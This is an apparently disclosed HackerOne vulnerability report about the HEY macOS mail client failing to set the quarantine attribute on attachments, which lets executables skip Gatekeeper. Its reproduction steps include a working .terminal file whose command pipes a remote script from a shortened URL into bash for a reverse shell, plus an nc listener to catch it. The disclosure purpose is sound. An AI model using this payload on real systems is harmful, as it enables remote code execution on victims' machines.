# Lack of quarantine macOS attribute(com.apple.quarantine) leads multiple issues including RCE

## Report Details
- **Report ID**: 1019389
- **URL**: https://hackerone.com/reports/1019389
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-10-26T22:13:23.947Z
- **Disclosed**: 2021-04-22T05:59:01.483Z

## Reporter
- **Username**: hensis
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: basecamp

## Vulnerability Information
Hi, basecamp team.

HEY macOS client does not properly validate file uploads on its macOS inbox. That is because, by not setting the `com.apple.quarantine` attribute in the metadata of an executable file when it is uploaded, you allow the file to be executed on macOS without being checked by Gatekeeper.

Basically, the bug here is that when sending an executable as a message, when opening it, the "file cannot be opened because it is from an unidentified developer" doesn't pop-up, the executable just gets executed

As a PoC(i prepared a video) I used a `.terminal` file, containing a backdoor payload.

# Steps-to Reproduce

1) Create a .terminal file with the following code:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>CommandString</key>
	<string>curl -Ls https://git.io/vXd2N | bash -s localhost 80 > exploit.sh;</string>
	<key>ProfileCurrentVersion</key>
	<real>2.0600000000000001</real>
	<key>RunCommandAsShell</key>
	<false/>
	<key>name</key>
	<string>exploit</string>
	<key>type</key>
	<string>Window Settings</string>
</dict>
</plist>
```
2) Send a mail with that file as an attachment
3) open another terminal window and execute: `nc -nvl 80`
4) As a victim download and open `.terminal` file, this will gain you a shell from the terminal window were you executed `nc -nvl 80`. As you can see, there is no alert for running Executable

# PoC video

{F1052935}

# For Further Info

for further info check the following reports from the person who found this vulnerability:

- https://hackerone.com/reports/470637
- https://hackerone.com/reports/430463

## Impact

An attacker can execute code on the victim's computer via the HEY macOS app.

## Attachments
- RCEHey.mp4
